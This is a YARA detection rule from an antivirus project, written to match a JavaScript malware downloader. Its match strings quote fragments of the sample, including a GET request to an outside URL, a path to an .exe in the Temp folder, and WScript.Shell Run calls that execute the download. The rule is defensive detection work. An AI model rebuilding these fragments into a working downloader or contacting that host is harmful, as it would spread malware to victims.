rule sig_20160328_2d3a5596b2f7e2d51747d97235758439 {
  meta:
    description = "datamaliciousorder - file 20160328_2d3a5596b2f7e2d51747d97235758439.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7a73cf84913dbc381e2eb99112716cada8dbe8c87d21dbb59da2ec76bf4c9929"

  strings:
    $s1  = "function Jqfapqg() {return Junfx[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"lzf9TW5LriDf.exe\";};" fullword ascii
    $s2  = "Urindq[Qgywcl](\"GET\", \"http://2biking.com/k4isfa\", false);" fullword ascii
    $s3  = "do {WScript[Bpkkz](Srywpvy() * 11)} while (Urindq[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Tvzejevai(Ricxezaga, Iltftokzg){return Ricxezaga - Iltftokzg;};" fullword ascii
    $s5  = "var Junfx = function Mhdvtbjdkp() {return WScript[Xmecumbzko](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Qoaen() {return ((Sjtuese == true) && (Sjtuese == Hmedxfaeya)) ? 1 : Ldupbyaet;};" fullword ascii
    $s7  = "function Vaxbdtuyzn(Iwgqedgiw){Junfx[\"Run\"](Iwgqedgiw, Ldupbyaet, Ldupbyaet);};" fullword ascii
    $s8  = "function Srywpvy(){return 22;};" fullword ascii
    $s9  = "return Tvzejevai(Nboidaco, Dhhcjvmt);" fullword ascii
    $s10 = "Sjtuese = true; " fullword ascii
    $s11 = "var Ipbdzzl = new this[\"Date\"]();" fullword ascii
    $s12 = " while (Erzdlfidwb){" fullword ascii
    $s13 = "function Iliwzk(Cjqvd) {var Nzejux = (1, 2, 3, 4, 5, Cjqvd); return Nzejux;};" fullword ascii
    $s14 = "function Ybishyvcqt()" fullword ascii
    $s15 = "var Sjtuese = false;" fullword ascii
    $s16 = "Hmedxfaeya = true; " fullword ascii
    $s17 = "var Hmedxfaeya = false;" fullword ascii
    $s18 = "function Pimeta(){return Xmecumbzko;};" fullword ascii
    $s19 = "var Mkvxriu = false;" fullword ascii
    $s20 = "function Vzxmhqjgnu(){return Kuynonp;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}